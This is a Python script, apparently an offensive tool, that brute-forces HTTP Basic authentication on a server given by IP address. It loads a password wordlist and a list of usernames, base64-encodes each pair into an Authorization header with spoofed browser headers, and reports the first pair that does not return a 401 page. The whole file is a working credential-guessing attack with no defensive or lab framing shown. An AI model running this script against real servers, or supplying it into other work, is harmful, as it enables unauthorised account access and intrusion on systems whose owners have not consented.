import os
import sys
import requests
import base64

ip = sys.argv[1]
users = sys.argv[2].split(",")
file = sys.argv[3]
passwords = []

print("[+] Loading wordlist...")

wordlistFile = open(file, 'r', encoding="latin-1")
wordlist = wordlistFile.readlines()
for password in wordlist:
    passwords.append(password.strip())

print(f"[+] Using {str(len(passwords))} passwords!")

def HTTPAuthEncode(username, password):
    try:
        sample_string_bytes = (username+":"+password).encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
        return base64_string
    except:
        print(f"[!] Failed at encoding {username}:{password} to base64!")
        return HTTPAuthEncode("user", "pass")

print("[+] Bruteforcing:")
for user in users:
    print(f"    - {user}")

i = 0
for password in passwords:
    for user in users:
        print(f'[{str(i + 1)}] Attempt: {user}:{password}')
        creds = HTTPAuthEncode(user, password)
        headers = {
            "Host": ip,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Authorization": f"Basic {creds}"
        }
        r = requests.get(f"http://{ip}/", headers=headers)
        if not "<title>401 Unauthorized</title>" in r.text:
            print(f"[+] CRACKED -> {user}:{password}")
            sys.exit(0)
        i = i + 1
